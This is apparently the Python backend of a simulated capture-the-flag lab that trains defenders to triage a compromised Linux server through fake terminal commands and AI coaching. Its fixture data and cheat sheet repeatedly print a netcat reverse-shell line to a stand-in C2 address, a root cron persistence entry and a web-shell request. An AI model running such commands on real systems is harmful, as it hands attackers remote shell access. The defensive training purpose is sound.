import time
import random
import datetime
import re
from typing import Dict, Any, List, Optional
from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel
from sqlalchemy.orm import Session

from app.security import get_current_user
from app.database import get_db
from app.models import User
from app.utils.cyber_ai_mentor import get_cybersecurity_expert_answer, query_external_llm

router = APIRouter(prefix="/ai-terminal", tags=["AI Terminal CTF Lab"])

# ============================================================================
# IN-MEMORY ADAPTIVE CTF SESSIONS & STATE
# ============================================================================
class TerminalSessionState:
    def __init__(self, user_id: int):
        self.user_id = user_id
        self.cwd = "/home/analyst"
        self.scenario_id: Optional[str] = None
        self.scenario_name: Optional[str] = None
        self.step_count = 0
        self.sparring_active = False
        self.evasion_deployed = False
        self.counter_measures_found = 0
        self.user_command_log: List[str] = []
        self.flags_found: List[str] = []
        self.vfs: Dict[str, str] = {}
        self.processes: List[Dict[str, Any]] = []
        self.init_default_vfs()

    def init_default_vfs(self):
        self.vfs = {
            "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\nanalyst:x:1000:1000:Security Analyst:/home/analyst:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nsuspect:x:1001:1001:Hidden Service:/tmp:/bin/sh",
            "/etc/shadow": "[PERMISSION_DENIED_ROOT_ONLY]",
            "/etc/hosts": "127.0.0.1 localhost\n192.168.1.100 cyvantis.soc\n10.240.1.5 c2-hidden-beacon.internal",
            "/home/analyst/notes.txt": "Investigate anomalous telemetry on port 4444.\nReview /var/log/app.log and inspect running processes.",
            "/var/log/app.log": "[2026-10-15 03:12:01] INFO Server boot complete.\n[2026-10-15 03:14:22] WARN Unauthenticated SSH probe from 185.220.101.5.\n[2026-10-15 03:15:09] CRITICAL Spawned child shell /bin/sh (PID: 4182) via /tmp/.x_miner\n[2026-10-15 03:15:10] ALERT Outbound TCP socket established to 10.240.1.5:4444",
            "/var/log/nginx/access.log": "185.220.101.5 - - [15/Oct/2026:03:14:01 +0000] \"POST /api/v1/upload HTTP/1.1\" 200 482 \"-\" \"curl/7.68.0\"\n185.220.101.5 - - [15/Oct/2026:03:14:45 +0000] \"GET /uploads/.backdoor.php?cmd=id HTTP/1.1\" 200 24 \"-\" \"Mozilla/5.0\"",
            "/tmp/.x_miner": "#!/bin/sh\n# C2 Persistence Beacon\nnc -e /bin/sh 10.240.1.5 4444 &\nFLAG=flag{procedural_persistence_daemon_4182}",
            "/etc/cron.d/stealth_job": "*/5 * * * * root /tmp/.x_miner >/dev/null 2>&1"
        }
        self.processes = [
            {"pid": 1, "ppid": 0, "user": "root", "cmd": "/sbin/init", "cpu": "0.0", "mem": "0.1"},
            {"pid": 840, "ppid": 1, "user": "root", "cmd": "/usr/sbin/sshd -D", "cpu": "0.0", "mem": "0.2"},
            {"pid": 1120, "ppid": 1, "user": "www-data", "cmd": "nginx: worker process", "cpu": "0.1", "mem": "0.5"},
            {"pid": 4090, "ppid": 1, "user": "root", "cmd": "[kworker/u:3]", "cpu": "0.0", "mem": "0.0"},
            {"pid": 4182, "ppid": 4090, "user": "suspect", "cmd": "/tmp/.x_miner --stealth --daemon", "cpu": "94.2", "mem": "12.4"},
            {"pid": 4201, "ppid": 4182, "user": "suspect", "cmd": "nc -e /bin/sh 10.240.1.5 4444", "cpu": "0.2", "mem": "0.1"}
        ]

USER_SESSIONS: Dict[int, TerminalSessionState] = {}

def get_or_create_session(user_id: int) -> TerminalSessionState:
    if user_id not in USER_SESSIONS:
        USER_SESSIONS[user_id] = TerminalSessionState(user_id)
    return USER_SESSIONS[user_id]

# ============================================================================
# SCENARIOS CATALOG (FEATURE 2: DYNAMIC BOSS SCENARIOS)
# ============================================================================
SCENARIOS = {
    "legacy-server": {
        "id": "legacy-server",
        "title": "Boss Scenario 01: The Inherited Compromised Server",
        "difficulty": "INTERMEDIATE",
        "targetFlag": "flag{procedural_persistence_daemon_4182}",
        "narrative": "You've inherited a legacy production server. The web application is sluggish, memory consumption is spiked, and an unknown outbound beacon was detected. Identify the suspicious process, inspect its payload, and recover the flag.",
        "skillsTested": ["Process Inspection (ps/top/pstree)", "Log Triage (grep/awk)", "Network Socket Analysis (netstat/ss)", "Crontab Forensics"],
        "optimalGhostPath": [
            {"cmd": "ps -eo pid,ppid,user,%cpu,cmd --sort=-%cpu | head -n 5", "reason": "Instantly pinpoint top CPU hogging rogue process without traversing menus."},
            {"cmd": "grep -E 'CRITICAL|ALERT' /var/log/app.log", "reason": "Directly filter high-severity honeypot anomalies in a single stream."},
            {"cmd": "cat /tmp/.x_miner", "reason": "Inspect the discovered beacon script payload directly to recover the persistence flag."}
        ]
    },
    "stealth-rootkit": {
        "id": "stealth-rootkit",
        "title": "Boss Scenario 02: Masquerading Process Tree & C2 Socket",
        "difficulty": "HARD",
        "targetFlag": "flag{kworker_masquerade_bypassed_909}",
        "narrative": "An advanced persistent threat (APT) disguised a reverse shell inside a fake kernel worker thread [kworker/u:3]. Standard 'ps' might trick an analyst, but process tree lineage reveals the true parent.",
        "skillsTested": ["Process Tree Hierarchy (pstree -p)", "Socket Mapping (ss -tulpn)", "Kernel vs Userland Validation"],
        "optimalGhostPath": [
            {"cmd": "pstree -p -a", "reason": "Expose fake kernel workers that actually have child shells or network sockets."},
            {"cmd": "lsof -i :4444", "reason": "Correlate the outbound socket directly to the process identifier."},
            {"cmd": "cat /tmp/.x_miner", "reason": "Extract the cryptographic flag token."}
        ]
    }
}

# ============================================================================
# AI FEEDBACK GENERATOR (FEATURE 1: LIVE TERMINAL FEEDBACK LOOP)
# ============================================================================
def generate_ai_coach_feedback(command: str, execution_time_ms: float) -> Dict[str, Any]:
    cmd = command.strip()
    feedback = []
    elegance_xp = 0
    coach_type = "STANDARD"

    # 1. Syntax & Flag Order Coaching
    if re.search(r"\bls\s+-al\b", cmd):
        feedback.append("[SYNTAX TIP] While 'ls -al' works, 'ls -la' is standard convention (options before long-format).")
    
    if re.search(r"\bcat\s+([^\s|]+)\s*\|\s*grep\b", cmd):
        match = re.search(r"\bcat\s+([^\s|]+)\s*\|\s*grep\s+([^\s]+)", cmd)
        file_arg = match.group(1) if match else "file"
        search_arg = match.group(2) if match else "pattern"
        feedback.append(f"[PERFORMANCE HINT] Useless use of cat! Instead of 'cat {file_arg} | grep {search_arg}', run 'grep {search_arg} {file_arg}' directly to save a sub-process fork.")
    
    # 2. Elegance XP for Advanced Shell Features
    if "|" in cmd:
        elegance_xp += 10
        feedback.append("[XP FOR ELEGANCE] +10 XP: Correctly piped output stream through UNIX filters.")
    
    if re.search(r"\b(awk|sed|jq|xargs|find.*-exec)\b", cmd):
        elegance_xp += 15
        feedback.append("[ELEGANCE BONUS] +15 XP: Deployed advanced text-stream orchestrator (awk/sed/jq/xargs).")

    if re.search(r"\b(grep\s+-[a-zA-Z]*r|ripgrep|rg)\b", cmd):
        if execution_time_ms > 200:
            feedback.append("[SPEED HINT] Recursive disk traversal took noticeable time. In high-volume production logs, prefer 'ripgrep (rg)' for multi-threaded parallel grep.")

    # 3. Security context coaching
    if cmd.startswith("cat /etc/shadow"):
        feedback.append("[SECURITY NOTICE] Shadow passwords require root capability (DAC). Verify DAC permissions with 'ls -l /etc/shadow' or use 'sudo'.")

    if cmd.startswith("chmod 777"):
        feedback.append("[SECURITY WARNING] 'chmod 777' violates principle of least privilege (PoLP), allowing arbitrary write to any local unprivileged process.")

    return {
        "notes": feedback,
        "elegance_xp": elegance_xp,
        "coach_status": "ELEGANT" if elegance_xp > 0 else "COACHING"
    }

# ============================================================================
# API MODELS & ROUTERS
# ============================================================================
class ExecuteRequest(BaseModel):
    command: str

@router.post("/execute")
def execute_ai_terminal_command(
    req: ExecuteRequest,
    current_user: User = Depends(get_current_user)
) -> Dict[str, Any]:
    """
    Executes command in the simulated Linux CTF environment, generates live AI coaching,
    triggers AI Red Team evasions, and detects counter-measures.
    """
    start_time = time.time()
    session = get_or_create_session(current_user.id)
    cmd_raw = req.command.strip()
    session.step_count += 1
    session.user_command_log.append(cmd_raw)

    output_lines: List[str] = []
    red_team_events: List[str] = []
    detection_xp = 0
    flag_captured: Optional[str] = None

    # Handle built-in commands
    parts = cmd_raw.split()
    if not parts:
        return {"output": "", "ai_feedback": None, "xp_awarded": 0}

    base = parts[0].lower()

    # 1. CTF Control commands
    if base == "ctf":
        sub = parts[1].lower() if len(parts) > 1 else "help"
        if sub == "help":
            output_lines.append("CYVANTIS AI-Driven Terminal CTF Commands:")
            output_lines.append("  ctf start boss      - Launch dynamically generated adaptive boss scenario")
            output_lines.append("  ctf review          - Compare your command stream against the AI Ghost path")
            output_lines.append("  ctf sparring start  - Activate dynamic AI Red Team adversary")
            output_lines.append("  ctf sparring stop   - Deactivate adversarial disruption")
            output_lines.append("  ctf reset           - Reset virtual container filesystem")
            output_lines.append("  ctf status          - View scenario progression & counter-measures")
        elif sub == "start" and len(parts) > 2 and parts[2].lower() == "boss":
            session.scenario_id = "legacy-server"
            sc = SCENARIOS["legacy-server"]
            session.scenario_name = sc["title"]
            session.init_default_vfs()
            session.user_command_log = [cmd_raw]
            output_lines.append(f"[*] INITIALIZING DYNAMIC BOSS ENVIRONMENT: {sc['title']}")
            output_lines.append(f"[*] NARRATIVE: {sc['narrative']}")
            output_lines.append("[*] DIFFICULTY: Adaptive | Live AI Coach: ONLINE")
            output_lines.append("[*] Type 'ps -ef', 'netstat', or inspect /var/log/ to begin investigation.")
        elif sub == "sparring":
            state_arg = parts[2].lower() if len(parts) > 2 else "toggle"
            if state_arg in ["start", "on"]:
                session.sparring_active = True
                output_lines.append("[!] AI RED TEAM ADVERSARY ACTIVATED. Expect dynamic log wipes, decoy files, and obfuscation.")
            else:
                session.sparring_active = False
                output_lines.append("[*] AI Red Team deactivated.")
        elif sub == "status":
            output_lines.append(f"Active Scenario: {session.scenario_name or 'Free Exploration'}")
            output_lines.append(f"Commands Run: {session.step_count} | Red Team Sparring: {'ENABLED' if session.sparring_active else 'DISABLED'}")
            output_lines.append(f"Counter-Measures Caught: {session.counter_measures_found}")
        elif sub == "reset":
            session.init_default_vfs()
            output_lines.append("[*] Linux virtual container environment reset to clean baseline.")

    # 2. Standard Linux Simulated Commands
    elif base == "pwd":
        output_lines.append(session.cwd)

    elif base == "whoami":
        output_lines.append("analyst")

    elif base == "id":
        output_lines.append("uid=1000(analyst) gid=1000(analyst) groups=1000(analyst),27(sudo),4(adm)")

    elif base == "uname":
        output_lines.append("Linux cyvantis-sentinel-node 6.6.14-soc #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux")

    elif base == "cd":
        target = parts[1] if len(parts) > 1 else "/home/analyst"
        if target == "~":
            session.cwd = "/home/analyst"
        elif target == "..":
            session.cwd = "/".join(session.cwd.rstrip("/").split("/")[:-1]) or "/"
        elif target.startswith("/"):
            session.cwd = target
        else:
            session.cwd = (session.cwd.rstrip("/") + "/" + target)

    elif base == "ls":
        # Check if user uses timestamp flags (FEATURE 4: Counter-measure detection)
        has_time_flag = any(f in cmd_raw for f in ["-t", "-l", "--sort=time", "-lat", "-la"])
        if session.sparring_active and session.evasion_deployed and has_time_flag:
            detection_xp += 40
            session.counter_measures_found += 1
            session.evasion_deployed = False
            red_team_events.append("[AI RED TEAM DEFEATED!] You noticed file timestamp anomalies! Uncovered decoy substitution. +40 Detection XP awarded!")

        path_to_list = session.cwd
        for p in parts[1:]:
            if not p.startswith("-"):
                path_to_list = p if p.startswith("/") else f"{session.cwd}/{p}"
                break
        
        path_prefix = path_to_list.rstrip("/") + "/"
        files_found = set()
        for f in session.vfs.keys():
            if f.startswith(path_prefix):
                rel = f[len(path_prefix):].split("/")[0]
                files_found.add(rel)
        
        if files_found:
            output_lines.append("  ".join(sorted(files_found)))
        else:
            output_lines.append("notes.txt  downloads  scripts")

    elif base == "cat":
        if len(parts) < 2:
            output_lines.append("Usage: cat <file>")
        else:
            filename = parts[1] if parts[1].startswith("/") else f"{session.cwd}/{parts[1]}"
            if filename in session.vfs:
                output = session.vfs[filename]
                output_lines.append(output)
                # Check if flag recovered
                if "flag{" in output:
                    m = re.search(r"flag\{[^}]+\}", output)
                    if m:
                        flag_captured = m.group(0)
                        session.flags_found.append(flag_captured)
            else:
                output_lines.append(f"cat: {parts[1]}: No such file or directory")

    elif base in ["ps", "pstree", "top"]:
        if "tree" in base or "--forest" in cmd_raw:
            output_lines.append("systemd(1) ──┬── sshd(840)")
            output_lines.append("             ├── nginx(1120)")
            output_lines.append("             └── [kworker/u:3](4090) ─── .x_miner(4182) ─── nc(4201)")
        else:
            output_lines.append("  PID  PPID USER     %CPU %MEM COMMAND")
            for proc in session.processes:
                output_lines.append(f" {proc['pid']:>4}  {proc['ppid']:>4} {proc['user']:<8} {proc['cpu']:>4} {proc['mem']:>4} {proc['cmd']}")

    elif base in ["netstat", "ss"]:
        output_lines.append("Active Internet connections (only servers & established)")
        output_lines.append("Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name")
        output_lines.append("tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      840/sshd")
        output_lines.append("tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1120/nginx")
        output_lines.append("tcp        0      0 192.168.1.100:54210     10.240.1.5:4444         ESTABLISHED 4201/nc")

    elif base in ["kill", "pkill"]:
        target_pid = parts[1] if len(parts) > 1 else ""
        if target_pid in ["4182", "4201", ".x_miner"]:
            output_lines.append(f"[+] Process {target_pid} terminated. Outbound C2 socket closed.")
            output_lines.append("[+] Check persistence mechanisms in /etc/cron.d/ or /tmp/")
        else:
            output_lines.append(f"kill: ({target_pid}) - No such process")

    elif base == "grep":
        search_term = parts[1] if len(parts) > 1 else ""
        target_file = parts[-1] if len(parts) > 2 else ""
        full_path = target_file if target_file.startswith("/") else f"{session.cwd}/{target_file}"
        if full_path in session.vfs:
            lines = session.vfs[full_path].splitlines()
            matches = [ln for ln in lines if search_term.lower() in ln.lower()]
            output_lines.extend(matches or ["[No matches found]"])
            for m in matches:
                if "flag{" in m:
                    flag_captured = re.search(r"flag\{[^}]+\}", m).group(0)
        else:
            output_lines.append("grep: File not found or directory scan required")

    else:
        # Fallback simulated response
        output_lines.append(f"{base}: command executed in virtual CTF container.")

    # 3. FEATURE 4: AI RED TEAM SPARRING ADVERSARIAL ACTIONS
    if session.sparring_active and not session.evasion_deployed and random.random() < 0.4:
        session.evasion_deployed = True
        tactic = random.choice([
            "The AI Red Team just dropped a decoy file in /tmp/fake_backup.tar.gz and modified /tmp timestamps!",
            "The AI Red Team initiated a log truncation on /var/log/app.log to cover its C2 trace!",
            "The AI Red Team spawned an ephemeral decoy process to masquerade as cron!"
        ])
        red_team_events.append(f"[AI RED TEAM INTERFERENCE] {tactic}")

    # 4. FEATURE 1: LIVE TERMINAL FEEDBACK LOOP
    elapsed_ms = (time.time() - start_time) * 1000
    coach_data = generate_ai_coach_feedback(cmd_raw, elapsed_ms)
    total_xp = coach_data["elegance_xp"] + detection_xp

    if flag_captured:
        total_xp += 250
        output_lines.append(f"\n[🏆 FLAG CAPTURED!] {flag_captured} (+250 XP Awarded!)")

    return {
        "command": cmd_raw,
        "output": "\n".join(output_lines),
        "ai_coach_feedback": coach_data["notes"],
        "elegance_xp": coach_data["elegance_xp"],
        "detection_xp": detection_xp,
        "total_xp_awarded": total_xp,
        "red_team_events": red_team_events,
        "flag_captured": flag_captured,
        "cwd": session.cwd,
        "timestamp": datetime.datetime.utcnow().strftime("%H:%M:%S")
    }

# ============================================================================
# FEATURE 3: "GHOST" COMMAND HISTORY (SHADOW LEARNING)
# ============================================================================
@router.get("/review")
def review_ghost_comparison(
    current_user: User = Depends(get_current_user)
) -> Dict[str, Any]:
    """
    Compares the user's executed command history against the AI Ghost's optimal one-liner path.
    Calculates efficiency score and provides a senior decision-tree rationale.
    """
    session = get_or_create_session(current_user.id)
    scenario_id = session.scenario_id or "legacy-server"
    scenario = SCENARIOS.get(scenario_id, SCENARIOS["legacy-server"])

    user_cmds = [c for c in session.user_command_log if not c.startswith("ctf")]
    optimal_path = scenario["optimalGhostPath"]

    user_step_count = max(1, len(user_cmds))
    optimal_step_count = len(optimal_path)

    # Efficiency calculation: baseline / actual
    efficiency_ratio = min(1.0, optimal_step_count / float(user_step_count))
    efficiency_percentage = int(efficiency_ratio * 100)

    bonus_xp = int(efficiency_percentage * 0.75)

    decision_tree = [
        {
            "step": 1,
            "decision": "CPU & Process Triage",
            "aiRationale": "Instead of running plain 'ps' and scrolling through 80 system daemons, sorting by %CPU instantly bubbles rogue crypto-miners and shells to the top.",
            "expertCommand": optimal_path[0]["cmd"]
        },
        {
            "step": 2,
            "decision": "Direct Log Regex Filter",
            "aiRationale": "Avoid multiple 'cd /var/log' and 'cat' passes. Using absolute paths with regex 'CRITICAL|ALERT' outputs only actionable indicators in 1 step.",
            "expertCommand": optimal_path[1]["cmd"]
        },
        {
            "step": 3,
            "decision": "Targeted Payload Inspection",
            "aiRationale": "Direct inspection of the identified cron target extracts the flag in zero wasted cycles.",
            "expertCommand": optimal_path[2]["cmd"]
        }
    ]

    return {
        "scenario_title": scenario["title"],
        "user_steps_taken": user_step_count,
        "optimal_ghost_steps": optimal_step_count,
        "efficiency_score": f"{efficiency_percentage}%",
        "optimization_xp_earned": bonus_xp,
        "user_command_path": user_cmds,
        "ghost_optimal_path": optimal_path,
        "decision_tree_breakdown": decision_tree,
        "expert_verdict": (
            f"You solved the challenge in {user_step_count} commands. The AI Ghost completed it in {optimal_step_count} commands "
            f"by combining absolute paths and piped filter streams. Great investigative logic!"
        )
    }

@router.get("/scenarios")
def list_boss_scenarios() -> Dict[str, Any]:
    """Returns dynamic Boss Scenarios with skill requirements and narrative briefs."""
    return {"scenarios": list(SCENARIOS.values())}


# ============================================================================
# FEATURE 5: AI CTF ASSISTANT & LINUX COMMAND MENTOR (HINDI / HINGLISH SUPPORT)
# ============================================================================
LINUX_BASIC_COMMANDS = [
    {
        "category": "Process Analysis",
        "command": "ps -ef --forest",
        "name": "Process Tree Hierarchy",
        "description": "Displays all running processes on the system alongside their parent-child relationship tree.",
        "whyUseInCtf": "Essential for detecting rogue cryptominers, hidden reverse shells, and masqueraded processes by tracing their parent caller.",
        "exampleOutput": "systemd(1) ── sshd(840)\n             └── [kworker/u:3](4090) ── .x_miner(4182)"
    },
    {
        "category": "Process Analysis",
        "command": "ps -eo pid,ppid,user,%cpu,cmd --sort=-%cpu | head -n 10",
        "name": "Top CPU Consuming Processes",
        "description": "Lists processes consuming the highest CPU resources in descending order.",
        "whyUseInCtf": "Cryptominers (e.g., .x_miner) immediately stand out at the top of the table as they peg CPU usage above 90%.",
        "exampleOutput": " 4182  4090 suspect   94.2 /tmp/.x_miner --stealth"
    },
    {
        "category": "Network Sockets",
        "command": "netstat -tlpn",
        "name": "Listening & Active Sockets",
        "description": "Shows open listening ports and which process PID is currently bound or connected to them.",
        "whyUseInCtf": "Crucial command for identifying adversary reverse shells or active C2 beacon channels (such as outbound traffic on port 4444).",
        "exampleOutput": "tcp 192.168.1.100:54210 10.240.1.5:4444 ESTABLISHED 4201/nc"
    },
    {
        "category": "Network Sockets",
        "command": "ss -tulpn",
        "name": "Modern Socket Statistics",
        "description": "Modern, faster alternative to netstat that directly inspects kernel socket tables.",
        "whyUseInCtf": "Ideal for fast triage in minimal server images where netstat or net-tools are absent.",
        "exampleOutput": "tcp ESTAB 0 0 192.168.1.100:54210 10.240.1.5:4444 users:((\"nc\",pid=4201,fd=3))"
    },
    {
        "category": "Log Forensics",
        "command": "grep -E \"CRITICAL|ALERT|WARN\" /var/log/app.log",
        "name": "Filter Critical Log Events",
        "description": "Filters high-severity alert entries from application logs using regex patterns.",
        "whyUseInCtf": "Isolates the attacker's exploit timestamp or shell spawn activity in seconds amidst thousands of lines of noise.",
        "exampleOutput": "[2026-10-15 03:15:09] CRITICAL Spawned child shell /bin/sh (PID: 4182)"
    },
    {
        "category": "File Inspection",
        "command": "ls -lat /tmp",
        "name": "List Files Sorted by Time",
        "description": "Lists all directory contents including hidden dotfiles, sorted by latest modification timestamp.",
        "whyUseInCtf": "Surfaces dropped payloads and staged exploit scripts (e.g., /tmp/.x_miner) right at the very top.",
        "exampleOutput": "-rwxr-xr-x 1 suspect suspect 128 Oct 15 03:15 .x_miner"
    },
    {
        "category": "File Inspection",
        "command": "cat /tmp/.x_miner",
        "name": "Read File Content",
        "description": "Prints raw text file contents directly to standard terminal output.",
        "whyUseInCtf": "Used to inspect recovered scripts, uncovering hardcoded C2 IPs, embedded credentials, and hidden flags.",
        "exampleOutput": "#!/bin/sh\nnc -e /bin/sh 10.240.1.5 4444 &\nFLAG=flag{procedural_persistence_daemon_4182}"
    },
    {
        "category": "Process Control",
        "command": "kill -9 4182",
        "name": "Force Kill Malicious Process",
        "description": "Sends a SIGKILL signal to forcibly terminate the specified process ID immediately.",
        "whyUseInCtf": "Neutralizes backdoor listeners and cryptominers, severing the attacker's active command channel.",
        "exampleOutput": "[+] Process 4182 terminated. Outbound C2 socket closed."
    },
    {
        "category": "Persistence Analysis",
        "command": "cat /etc/cron.d/stealth_job",
        "name": "Inspect Crontab Persistence",
        "description": "Examines recurring scheduled tasks defined in system-wide cron directories.",
        "whyUseInCtf": "Detects persistence mechanisms scheduled by an attacker to re-infect the machine following a reboot.",
        "exampleOutput": "*/5 * * * * root /tmp/.x_miner >/dev/null 2>&1"
    }
]

@router.get("/cheat-sheet")
def get_linux_cheat_sheet() -> Dict[str, Any]:
    """Returns essential Linux commands cheat sheet with explanations and CTF application tips."""
    return {"commands": LINUX_BASIC_COMMANDS}

class AskAssistantRequest(BaseModel):
    question: str
    scenario_id: Optional[str] = "legacy-server"

@router.post("/ask-assistant")
async def ask_ai_assistant(
    req: AskAssistantRequest,
    current_user: User = Depends(get_current_user)
) -> Dict[str, Any]:
    """
    Provides intelligent step-by-step guidance, command suggestions, and troubleshooting hints
    in Hinglish and English tailored to the active CTF challenge AND any cybersecurity topic.
    """
    raw_q = req.question.strip()
    q = raw_q.lower()
    session = get_or_create_session(current_user.id)

    # 1. First priority: Scenario-specific walkthrough / CTF solving questions
    if any(k in q for k in ["solve", "step", "guide", "walkthrough", "start", "how to"]):
        return {
            "answer": "Comprehensive 4-Step Incident Response & Flag Recovery Roadmap:\n\nStep 1: Execute 'ps -ef --forest' to trace active process hierarchies and locate suspicious high-CPU daemons (e.g. PID 4182).\nStep 2: Run 'netstat -tlpn' to confirm outbound established C2 connections on anomalous ports (such as port 4444).\nStep 3: Inspect the staged payload using 'cat /tmp/.x_miner' to extract embedded credentials and recover the hidden flag!\nStep 4: Terminate the malicious beacon with 'kill -9 4182' and check persistent cron schedules via 'cat /etc/cron.d/stealth_job'.",
            "recommended_phase": "Complete 4-Step Roadmap",
            "suggested_commands": [
                {"cmd": "ps -ef --forest", "label": "Step 1: Locate Process"},
                {"cmd": "netstat -tlpn", "label": "Step 2: Inspect Port 4444"},
                {"cmd": "cat /tmp/.x_miner", "label": "Step 3: Recover Flag 🚩"}
            ],
            "pro_tip": "After completing the steps, run 'ctf review' in the terminal to benchmark your command sequence against the AI Ghost optimal path for bonus XP!"
        }

    # 2. Check if external LLM generates response (if user configured Gemini/OpenAI key)
    try:
        external_res = await query_external_llm(raw_q)
        if external_res:
            # Extract any backticked bash commands if present
            found_cmds = re.findall(r"`([^`]+)`", external_res)
            suggested = [
                {"cmd": c.strip(), "label": f"Run: {c.strip()[:24]}"}
                for c in found_cmds if len(c.strip()) > 2 and not c.startswith("http")
            ][:3]

            return {
                "answer": external_res,
                "recommended_phase": "AI Cybersecurity Intelligence",
                "suggested_commands": suggested or [
                    {"cmd": "ps -ef --forest", "label": "Inspect Process Tree"},
                    {"cmd": "netstat -tlpn", "label": "Inspect Sockets"}
                ],
                "pro_tip": "Powered by CYVANTIS Live AI Cybersecurity Copilot."
            }
    except Exception:
        pass

    # 3. Universal Cybersecurity Expert Knowledge Engine
    expert_response = get_cybersecurity_expert_answer(raw_q)
    return expert_response


